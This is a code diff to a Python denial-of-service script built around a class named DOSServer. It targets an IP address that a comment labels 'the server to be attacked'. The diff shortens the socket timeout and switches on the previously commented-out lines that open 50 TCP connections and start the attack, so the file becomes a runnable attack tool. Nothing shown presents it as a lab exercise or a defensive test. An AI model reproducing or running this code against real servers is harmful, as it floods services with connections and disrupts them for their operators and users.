@@ -18,7 +18,7 @@ class DOSServer():
         #     "User-Agent: Mozilla/5.0 Gecko/20091102 Chrome/3.5.5",
         #     "Accept-Language: en-us,en;q=0.5"
         # ]
-        self.getMessage = self.rsaEncryption("hi")
+        self.getMessage = bytes(self.rsaEncryption("hi"), 'utf-8')
 
     def createSocket(self):
         # try:
@@ -27,7 +27,7 @@ class DOSServer():
         #Need TCP connection because TCP creates a connection, vs. UCP which is connectionless
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         #set socket timeout
-        s.settimeout(10000)
+        s.settimeout(50)
         #connect socket to the server 
         s.connect((self._ip, self._port))
         #send the data to the server
@@ -137,7 +137,7 @@ ip = "192.168.31.237"
 # #change this to the IP of the server to be attacked
 DOSServer= DOSServer(ip)
 # #create sockets based on number of sockets
-# DOSServer.sockets = [DOSServer.createSocket() for _ in range(numberOfSockets)]
-# DOSServer.attack()
+DOSServer.sockets = [DOSServer.createSocket() for _ in range(50)]
+DOSServer.attack()
 
 
